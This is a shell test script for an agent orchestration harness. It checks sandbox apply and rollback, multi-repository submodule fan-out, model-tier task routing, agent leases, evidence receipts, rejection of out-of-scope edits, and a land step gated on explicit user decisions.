printf 'before\n' > app.txt
printf 'unrelated during build\n' > NOTES.md
if FOUNDATION_TEST_MODE=1 FOUNDATION_TEST_FAIL_APPLY_AFTER=1 \
  node .claude/harness/foundation.mjs sandbox apply sandbox-copy >/dev/null 2>&1; then
  fail "injected partial apply fails"
else
  pass "injected partial apply fails"
fi
assert_eq "failed partial apply rolls target back" "before" \
  "$(tr -d '\n' < app.txt)"
assert_eq "rollback keeps proof state retryable" "proven" \
  "$(jq -r '.status' .foundation/runtime/sandbox-copy.json)"
assert_file_contains "rollback preserves unrelated target edits" NOTES.md \
  "unrelated during build"
assert_cmd_zero "proven sandbox applies transactionally" \
  node .claude/harness/foundation.mjs sandbox apply sandbox-copy
applied="$(tr -d '\n' < app.txt)"
assert_eq "target matches sandbox content" "after" "$applied"
assert_eq "Git worktree apply preserves changed symlink" "target-b.txt" \
  "$(readlink current-link)"
assert_file_contains "land returns completed task ledger" \
  openspec/changes/sandbox-copy/tasks.md "- [x]"
assert_file_contains "successful apply preserves unrelated target edits" NOTES.md \
  "unrelated during build"

# A superproject fixture proves that topology discovery, worktree fan-out,
# repository packets, model routing, and receipt invalidation share one
# composite control-plane identity without invalidating unrelated repo proof.
for child in api app; do
  mkdir -p "$TMP/$child"
  cd "$TMP/$child"
  git init -q
  git config user.name "Foundation Test"
  git config user.email "foundation@example.invalid"
  printf '%s\n' "$child-before" > "$child.txt"
  git add .
  git commit -qm "$child fixture"
done
mkdir -p "$TMP/multi-project/.claude/harness" "$TMP/multi-project/openspec" \
  "$TMP/multi-project/.foundation"
cp "$ROOT/.claude/harness/foundation.mjs" "$TMP/multi-project/.claude/harness/"
cp -R "$ROOT/.claude/harness/runtime" "$TMP/multi-project/.claude/harness/"
cp "$ROOT/.claude/harness/commands.json" "$TMP/multi-project/.claude/harness/"
cp -R "$ROOT/openspec/schemas" "$TMP/multi-project/openspec/"
cp "$ROOT/openspec/config.yaml" "$TMP/multi-project/openspec/"
cp "$ROOT/openspec/repositories.yaml" "$TMP/multi-project/openspec/"
cp "$ROOT/foundation.json" "$TMP/multi-project/"
cp "$ROOT/.foundation/.gitignore" "$TMP/multi-project/.foundation/"
cd "$TMP/multi-project"
git init -q
git config user.name "Foundation Test"
git config user.email "foundation@example.invalid"
git -c protocol.file.allow=always submodule add -q "$TMP/api" api
git -c protocol.file.allow=always submodule add -q "$TMP/app" app
git add .
git commit -qm "multi fixture"
repos="$(node .claude/harness/foundation.mjs repos)"
assert_contains "repository topology discovers API submodule" "$repos" "api	submodule	api"
assert_contains "repository topology discovers app submodule" "$repos" "app	submodule	app"
node .claude/harness/foundation.mjs new 'Cross repository profile' >/dev/null
node .claude/harness/foundation.mjs resolve cross-repository-profile \
  --impact medium --coupling coupled --acceptance-not-required >/dev/null
printf '%s\n' \
  '{"version":1,"repositories":[' \
  '  {"id":"api","mode":"write","dependsOn":[]},' \
  '  {"id":"app","mode":"write","dependsOn":["api"]}' \
  ']}' > openspec/changes/cross-repository-profile/repositories.yaml
printf '%s\n' \
  '# Tasks' \
  '' \
  '- [ ] **T001** Inventory API [repo:api] [kind:inventory] [paths:api.txt]' \
  '- [ ] **T002** Implement API [repo:api] [kind:implementation] [depends:T001] [paths:api.txt]' \
  '- [ ] **T003** Implement App [repo:app] [kind:implementation] [paths:app.txt]' \
  '- [ ] **T004** Review contract [repo:app] [kind:contract] [depends:T002,T003]' \
  > openspec/changes/cross-repository-profile/tasks.md
printf '%s\n' \
  '{"version":2,"claims":[' \
  ' {"id":"api-static","scenario":"API remains statically valid","impact":"medium","capabilities":["static-analysis"],"repositories":["api"]},' \
  ' {"id":"profile-contract","scenario":"API and App agree","impact":"medium","capabilities":["cross-repo-contract"],"repositories":["api","app"]}' \
  ']}' > openspec/changes/cross-repository-profile/evidence.yaml
printf '%s\n' \
  '{"version":1,"providers":{' \
  ' "api-static":{"capability":"static-analysis","adapter":"external","repository":"api"},' \
  ' "cross-repo-contract":{"adapter":"external"},' \
  ' "review":{"adapter":"external"}' \
  '},"services":{}}' > openspec/changes/cross-repository-profile/execution.yaml
assert_cmd_zero "multi-repository change validates" \
  node .claude/harness/foundation.mjs validate cross-repository-profile
assert_cmd_zero "multi-repository sandboxes fan out" \
  node .claude/harness/foundation.mjs sandbox create cross-repository-profile --all
assert_file_exists "API worktree created" \
  .foundation/repository-sandboxes/cross-repository-profile/api/api.txt
assert_file_exists "app worktree created" \
  .foundation/repository-sandboxes/cross-repository-profile/app/app.txt
printf 'unauthorized\n' > \
  .foundation/repository-sandboxes/cross-repository-profile/app/rogue.txt
surface_output="$(node .claude/harness/foundation.mjs proof-preflight \
  cross-repository-profile 2>&1 || true)"
assert_contains "changed-surface authority rejects undeclared paths" \
  "$surface_output" "changed outside task paths: rogue.txt"
rm .foundation/repository-sandboxes/cross-repository-profile/app/rogue.txt
printf 'committed unauthorized\n' > \
  .foundation/repository-sandboxes/cross-repository-profile/app/rogue.txt
git -C .foundation/repository-sandboxes/cross-repository-profile/app add rogue.txt
git -C .foundation/repository-sandboxes/cross-repository-profile/app \
  -c user.name="Foundation Test" -c user.email="foundation@example.invalid" \
  commit -qm "committed unauthorized path"
surface_output="$(node .claude/harness/foundation.mjs proof-preflight \
  cross-repository-profile 2>&1 || true)"
assert_contains "committed changed-surface authority rejects undeclared paths" \
  "$surface_output" "changed outside task paths: rogue.txt"
git -C .foundation/repository-sandboxes/cross-repository-profile/app rm -q rogue.txt
git -C .foundation/repository-sandboxes/cross-repository-profile/app \
  -c user.name="Foundation Test" -c user.email="foundation@example.invalid" \
  commit -qm "remove unauthorized path"
api_packet="$(node .claude/harness/foundation.mjs packet cross-repository-profile --repo api)"
assert_contains "repo packet selects API" "$api_packet" '"id":"api"'
assert_contains "repo packet includes API task" "$api_packet" '"id":"T001"'
if printf '%s' "$api_packet" | grep -qF '"id":"T003"'; then
  fail "repo packet excludes app task"
else
  pass "repo packet excludes app task"
fi
agent_plan="$(node .claude/harness/foundation.mjs agent-plan cross-repository-profile)"
assert_contains "agent plan is summary-first" "$agent_plan" '"modelCounts":'
if printf '%s' "$agent_plan" | grep -qF '"text":'; then
  fail "agent plan summary excludes full task text"
else
  pass "agent plan summary excludes full task text"
fi
if [ "$(printf '%s' "$agent_plan" | wc -c | tr -d ' ')" -le 4096 ]; then
  pass "agent plan summary stays within 4 KiB"
else
  fail "agent plan summary stays within 4 KiB"
fi
agent_task="$(node .claude/harness/foundation.mjs agent-task \
  cross-repository-profile T001)"
assert_contains "inventory task packet routes to Haiku tier" \
  "$agent_task" '"family":"haiku"'
if printf '%s' "$agent_task" | grep -qF '"id":"T003"'; then
  fail "task packet excludes unrelated tasks"
else
  pass "task packet excludes unrelated tasks"
fi
agent_task="$(node .claude/harness/foundation.mjs agent-task \
  cross-repository-profile T002)"
assert_contains "implementation task packet routes to Sonnet tier" \
  "$agent_task" '"family":"sonnet"'
agent_task="$(node .claude/harness/foundation.mjs agent-task \
  cross-repository-profile T004)"
assert_contains "contract task packet routes to Opus tier" \
  "$agent_task" '"family":"opus"'
assert_cmd_zero "task resource lease is acquired atomically" \
  node .claude/harness/foundation.mjs agent-acquire \
  cross-repository-profile T001 --owner agent-a
if node .claude/harness/foundation.mjs agent-acquire \
  cross-repository-profile T001 --owner agent-b >/dev/null 2>&1; then
  fail "task resource lease blocks a competing agent"
else
  pass "task resource lease blocks a competing agent"
fi
assert_cmd_zero "task resource lease releases by owner" \
  node .claude/harness/foundation.mjs agent-release \
  cross-repository-profile T001 --owner agent-a
node .claude/harness/foundation.mjs receipt cross-repository-profile \
  api-static pass --observed "API static fixture passed" \
  --source harness-test --artifact api.txt >/dev/null
printf 'app-after\n' > \
  .foundation/repository-sandboxes/cross-repository-profile/app/app.txt
scoped_plan="$(node .claude/harness/foundation.mjs proof-plan cross-repository-profile)"
assert_contains "unrelated repo edit preserves API receipt" \
  "$scoped_plan" "api-static: valid"
printf 'api-after\n' > \
  .foundation/repository-sandboxes/cross-repository-profile/api/api.txt
scoped_plan="$(node .claude/harness/foundation.mjs proof-plan cross-repository-profile)"
assert_contains "owning repo edit invalidates API receipt" \
  "$scoped_plan" "api-static: stale"
multi_review_packet="$(node .claude/harness/foundation.mjs packet \
  cross-repository-profile --phase review)"
assert_contains "review packet includes API repository changes" \
  "$multi_review_packet" 'api/api.txt'
assert_contains "review packet includes app repository changes" \
  "$multi_review_packet" 'app/app.txt'
land_plan="$(node .claude/harness/foundation.mjs land-plan cross-repository-profile)"
assert_contains "multi-repo Land is an honest saga" \
  "$land_plan" '"strategy": "ordered-resumable-saga"'
assert_contains "uncommitted child blocks Land" \
  "$land_plan" '"status": "awaiting-explicit-commit"'
git -C .foundation/repository-sandboxes/cross-repository-profile/api \
  add api.txt
git -C .foundation/repository-sandboxes/cross-repository-profile/api \
  -c user.name="Foundation Test" \
  -c user.email="foundation@example.invalid" \
  commit -qm "api profile"
api_commit="$(git -C .foundation/repository-sandboxes/cross-repository-profile/api rev-parse HEAD)"
git -C .foundation/repository-sandboxes/cross-repository-profile/app \
  add app.txt
git -C .foundation/repository-sandboxes/cross-repository-profile/app \
  -c user.name="Foundation Test" \
  -c user.email="foundation@example.invalid" \
  commit -qm "app profile"
app_commit="$(git -C .foundation/repository-sandboxes/cross-repository-profile/app rev-parse HEAD)"
committed_review_packet="$(node .claude/harness/foundation.mjs packet \
  cross-repository-profile --phase review)"
assert_contains "review packet retains committed API changes" \
  "$committed_review_packet" 'api/api.txt'
assert_contains "review packet retains committed app changes" \
  "$committed_review_packet" 'app/app.txt'
printf '%s' "$committed_review_packet" > "$TMP/committed-review-packet.json"
assert_cmd_zero "review packet exposes executable API inspection metadata" \
  jq -e --arg base "$(jq -r '.repositories.api.baseHead' \
    .foundation/runtime/cross-repository-profile.json)" \
    '.changedSurface.inspection[] |
      select(.repositoryId == "api" and .baseHead == $base) |
      .paths | index("api.txt") != null' \
    "$TMP/committed-review-packet.json"
assert_cmd_zero "review packet names the API sandbox workspace" \
  jq -e --arg workspace "$(jq -r '.repositories.api.path' \
    .foundation/runtime/cross-repository-profile.json)" \
    '.changedSurface.inspection[] |
      select(.repositoryId == "api" and .workspacePath == $workspace)' \
    "$TMP/committed-review-packet.json"
assert_cmd_zero "review decision artifacts expose their readable workspace" \
  jq -e '.decisions.proposal.workspacePath and
    .decisions.proposal.relativePath == "proposal.md" and
    .decisions.design.workspacePath and
    .decisions.specs.workspacePath' \
    "$TMP/committed-review-packet.json"
assert_cmd_zero "review packet exposes executable app inspection metadata" \
  jq -e --arg base "$(jq -r '.repositories.app.baseHead' \
    .foundation/runtime/cross-repository-profile.json)" \
    '.changedSurface.inspection[] |
      select(.repositoryId == "app" and .baseHead == $base) |
      .paths | index("app.txt") != null' \
    "$TMP/committed-review-packet.json"
sed -i.bak 's/- \[ \]/- [x]/g' \
  .foundation/sandboxes/cross-repository-profile/openspec/changes/cross-repository-profile/tasks.md
rm .foundation/sandboxes/cross-repository-profile/openspec/changes/cross-repository-profile/tasks.md.bak
node .claude/harness/foundation.mjs receipt cross-repository-profile \
  api-static pass --observed "API static fixture passed" \
  --source harness-test --artifact api.txt >/dev/null
node .claude/harness/foundation.mjs receipt cross-repository-profile \
  cross-repo-contract pass --observed "API/App contract fixture passed" \
  --source harness-test --reference "fixture://cross-repo-contract" >/dev/null
node .claude/harness/foundation.mjs receipt cross-repository-profile \
review pass --observed "fixture review found no blockers" \
  --reviewer harness-test --subject-actor implementation-agent \
  --reference "fixture://review" >/dev/null
assert_cmd_zero "committed multi-repo work proves" \
  node .claude/harness/foundation.mjs prove cross-repository-profile
git -C api merge -q --ff-only "$api_commit"
git -C app merge -q --ff-only "$app_commit"
assert_cmd_fails_with "Land record stops for explicit user authority" \
  "requires --decision-ref" \
  node .claude/harness/foundation.mjs land-record cross-repository-profile \
  --repo api --commit "$api_commit" --ci pass
assert_cmd_zero "explicit API commit is bound to Land" \
  node .claude/harness/foundation.mjs land-record cross-repository-profile \
  --repo api --commit "$api_commit" --ci pass \
  --decision-ref fixture://user/land-api
assert_cmd_zero "explicit app commit is bound to Land" \
  node .claude/harness/foundation.mjs land-record cross-repository-profile \
  --repo app --commit "$app_commit" --ci pass \
  --decision-ref fixture://user/land-app
resume_stage="$(node .claude/harness/foundation.mjs land-resume \
  cross-repository-profile)"
assert_contains "Land resume stages eligible root gitlinks transactionally" \
  "$resume_stage" "ROOT POINTERS STAGED"
if node .claude/harness/foundation.mjs land-check \
  cross-repository-profile >/dev/null 2>&1; then
  fail "root pointer staging invalidates composite proof"
else
  pass "root pointer staging invalidates composite proof"
fi
node .claude/harness/foundation.mjs receipt cross-repository-profile \
  cross-repo-contract pass --observed "API/App contract fixture passed" \
  --source harness-test --reference "fixture://cross-repo-contract" >/dev/null
node .claude/harness/foundation.mjs receipt cross-repository-profile \
review pass --observed "fixture review found no blockers" \
  --reviewer harness-test --subject-actor implementation-agent \
  --reference "fixture://review" >/dev/null
assert_cmd_zero "pointer-aware composite proof refreshes" \
  node .claude/harness/foundation.mjs prove cross-repository-profile
resume_plan="$(node .claude/harness/foundation.mjs land-resume cross-repository-profile)"
assert_contains "Land resume observes landed children" \
  "$resume_plan" '"status": "child-landed"'
assert_contains "root target gitlink matches recorded commit" \
  "$resume_plan" '"readyToArchive": true'

# Large brownfield plans remain navigable without injecting every task into the
# orchestrator context. Full detail stays in the persisted plan and task packet.
large_workspace="$(jq -r '.workspace.path' \
  .foundation/runtime/cross-repository-profile.json)"
large_tasks="$large_workspace/openspec/changes/cross-repository-profile/tasks.md"
printf '%s\n' '# Tasks' '' > "$large_tasks"
task_number=1
while [ "$task_number" -le 100 ]; do
  task_id="$(printf 'T%03d' "$task_number")"
  printf '%s\n' \
    "- [ ] **$task_id** Brownfield task $task_number [repo:api] [kind:implementation] [paths:api.txt]" \
    >> "$large_tasks"
  task_number=$((task_number + 1))
done
large_plan="$(node .claude/harness/foundation.mjs agent-plan \
  cross-repository-profile)"
assert_contains "large plan reports all tasks" "$large_plan" '"taskCount":100'
assert_contains "large plan compacts group details" "$large_plan" '"preview":'
if [ "$(printf '%s' "$large_plan" | wc -c | tr -d ' ')" -le 4096 ]; then
  pass "100-task plan summary stays within 4 KiB"
else
  fail "100-task plan summary stays within 4 KiB"
fi
large_packet="$(node .claude/harness/foundation.mjs packet \
  cross-repository-profile)"
if [ "$(printf '%s' "$large_packet" | wc -c | tr -d ' ')" -le 16384 ]; then
  pass "100-task global packet stays within 16 KiB"
else
  fail "100-task global packet stays within 16 KiB"
fi
context_metrics="$(node .claude/harness/foundation.mjs metrics \
  cross-repository-profile)"
assert_contains "metrics expose context byte totals" \
  "$context_metrics" '"estimatedTokens":'
assert_contains "metrics separate plan and packet context" \
  "$context_metrics" '"agent-plan-summary":'
assert_contains "context estimate declares its measurement scope" \
  "$context_metrics" '"emitted-plan-and-packet-bytes-only"'

# Runtime state whose active OpenSpec directory disappeared must remain visible
# and diagnosable instead of being silently omitted from `changes`.
printf '%s\n' \
  '{"id":"orphan-fixture","status":"change","schema":"foundation-rapid"}' \
  > .foundation/runtime/orphan-fixture.json
changes_with_orphan="$(node .claude/harness/foundation.mjs changes)"
assert_contains "changes exposes orphan runtime state" \
  "$changes_with_orphan" 'orphan-fixture'
assert_contains "changes classifies orphan runtime state" \
  "$changes_with_orphan" 'orphan-runtime'
doctor_with_orphan="$(node .claude/harness/foundation.mjs doctor \
  --stage prove --change orphan-fixture 2>/dev/null || true)"
assert_contains "doctor gives an explicit orphan error" \
  "$doctor_with_orphan" 'ERROR change:orphan-fixture'
assert_contains "doctor gives a recoverable orphan action" \
  "$doctor_with_orphan" '.foundation/recovery/orphaned-runtime/'

finish "harness contracts"
